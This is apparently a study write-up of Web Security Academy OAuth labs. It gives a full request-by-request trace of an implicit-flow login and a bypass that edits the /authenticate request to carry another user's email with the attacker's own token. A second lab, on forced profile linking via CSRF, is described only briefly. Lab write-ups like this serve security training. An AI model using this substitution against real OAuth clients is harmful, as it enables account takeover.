## Lab - 1: Authentication bypass via OAuth implicit flow (A)

- This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the client application makes it possible for an attacker to log in to other users' accounts without knowing their password. To solve the lab, log in to Carlos's account. His email address is carlos@carlos-montoya.net. You can log in with your own social media account using the following credentials: wiener:peter.

> Flow of OAuth process for this lab

1. `GET /my-account` from application redirected to `/social-login`
2. `GET /social-login` -> response contains meta tag to fetch from OAuth service

```html
<meta
  http-equiv="refresh"
  content="3;url=https://oauth-0aa20037048bd37cc089049e029c00d2.web-security-academy.net/auth?client_id=quzs4k6iz0iqzfchxka1k&redirect_uri=https://0ab700250451d3a5c0ee0410001a00c9.web-security-academy.net/oauth-callback&response_type=token&nonce=-1853408548&scope=openid%20profile%20email"
/>
```

3. then the following GET request takes place to get from OAuth server

```
GET /auth?client_id=quzs4k6iz0iqzfchxka1k&redirect_uri=https://0ab700250451d3a5c0ee0410001a00c9.web-security-academy.net/oauth-callback&response_type=token&nonce=-1853408548&scope=openid%20profile%20email HTTP/1.1
Host: oauth-0aa20037048bd37cc089049e029c00d2.web-security-academy.net
```

4. It has

<details>
<summary>
 this response
</summary>

```
HTTP/1.1 302 Found
X-Powered-By: Express
Pragma: no-cache
Cache-Control: no-cache, no-store
Set-Cookie: _interaction=cXAbo8_Osu7Vjt44iUQyP; path=/interaction/cXAbo8_Osu7Vjt44iUQyP; expires=Fri, 07 Oct 2022 16:55:31 GMT; samesite=lax; secure; httponly
Set-Cookie: _interaction_resume=cXAbo8_Osu7Vjt44iUQyP; path=/auth/cXAbo8_Osu7Vjt44iUQyP; expires=Fri, 07 Oct 2022 16:55:31 GMT; samesite=lax; secure; httponly
Set-Cookie: _session=wsnG2VfazKNNgHuWTj0ew; path=/; expires=Fri, 21 Oct 2022 16:45:31 GMT; samesite=none; secure; httponly
Set-Cookie: _session.legacy=wsnG2VfazKNNgHuWTj0ew; path=/; expires=Fri, 21 Oct 2022 16:45:31 GMT; secure; httponly
Location: /interaction/cXAbo8_Osu7Vjt44iUQyP
...

Redirecting to <a href="/interaction/cXAbo8_Osu7Vjt44iUQyP">/interaction/cXAbo8_Osu7Vjt44iUQyP</a>`
```

</details>

5. It redirects to

```
GET /interaction/SSmbqLjw_N9qhTQEjMUyQ HTTP/1.1
Host: oauth-0aa20037048bd37cc089049e029c00d2.web-security-academy.net
```

from OAuth server and contain button to `Continue`

```html
<form
  autocomplete="off"
  action="/interaction/cXAbo8_Osu7Vjt44iUQyP/confirm"
  method="post"
>
  <button autofocus type="submit" class="login login-submit">Continue</button>
</form>
```

6. If submitted, it will make a POST request to OAuth service

```
POST /interaction/cXAbo8_Osu7Vjt44iUQyP/confirm HTTP/1.1
Host: oauth-0aa20037048bd37cc089049e029c00d2.web-security-academy.net
```

which redirects to `https://oauth-0aa20037048bd37cc089049e029c00d2.web-security-academy.net/auth/cXAbo8_Osu7Vjt44iUQyP`

7. again it redirects to application callback `https://0ab700250451d3a5c0ee0410001a00c9.web-security-academy.net/oauth-callback#access_token=cak10bhH032h6tHMqRXXF-J7PuuHMNB0Mf_cBDrA4G1&amp;expires_in=3600&amp;token_type=Bearer&amp;scope=openid%20profile%20email`

8. at

```
GET /oauth-callback HTTP/1.1
Host: 0ab700250451d3a5c0ee0410001a00c9.web-security-academy.net
```

from application, response is to parse the URL to extract the data like this

<details>
  <summary>JS code to fetch URL parameter values</summary>

```html
<script>
  const urlSearchParams = new URLSearchParams(window.location.hash.substr(1));
  const token = urlSearchParams.get("access_token");
  fetch(
    "https://oauth-0aa20037048bd37cc089049e029c00d2.web-security-academy.net/me",
    {
      method: "GET",
      headers: {
        Authorization: "Bearer " + token,
        "Content-Type": "application/json",
      },
    }
  )
    .then((r) => r.json())
    .then((j) =>
      fetch("/authenticate", {
        method: "POST",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          email: j.email,
          username: j.sub,
          token: token,
        }),
      }).then((r) => (document.location = "/"))
    );
</script>
```

</details>

9. Inside above code, fetching `https://oauth-0aa20037048bd37cc089049e029c00d2.web-security-academy.net/me` will get required data like this

```json
{
  "sub": "wiener",
  "name": "Peter Wiener",
  "email": "wiener@hotdog.com",
  "email_verified": true
}
```

10. finally, it will make `POST /authenticate` to application and user is logged in

```
POST /authenticate HTTP/1.1
Host: 0ab700250451d3a5c0ee0410001a00c9.web-security-academy.net
...
{"email":"wiener@hotdog.com","username":"wiener","token":"cak10bhH032h6tHMqRXXF-J7PuuHMNB0Mf_cBDrA4G1"}
```

- to solve the lab, change the email to `carlos's email` if the request is via interception on mode OR in POST request box, Right-Click > Request in browser > in original session > copy the URL and paste it in the browser

---

## Lab - 2: Forced OAuth profile linking (P)

- This lab gives you the option to attach a social media profile to your account so that you can log in via OAuth instead of using the normal username and password. Due to the insecure implementation of the OAuth flow by the client application, an attacker can manipulate this functionality to obtain access to other users' accounts. To solve the lab, use a CSRF attack to attach your own social media profile to the admin user's account on the blog website, then access the admin panel and delete Carlos. The admin user will open anything you send from the exploit server and they always have an active session on the blog website. You can log in to your own accounts using the following credentials:
  Blog website account: wiener:peter
  Social media profile: peter.wiener:hotdog
